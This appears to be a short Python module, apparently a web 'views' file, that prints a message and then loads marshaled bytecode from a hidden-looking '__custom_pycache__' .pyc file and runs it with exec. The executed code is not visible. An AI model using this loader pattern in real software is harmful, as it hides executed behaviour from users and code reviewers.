
import marshal
import os
print("updated message")
s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'views_f20bb5ec2c514c1bb00f75101947b565.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
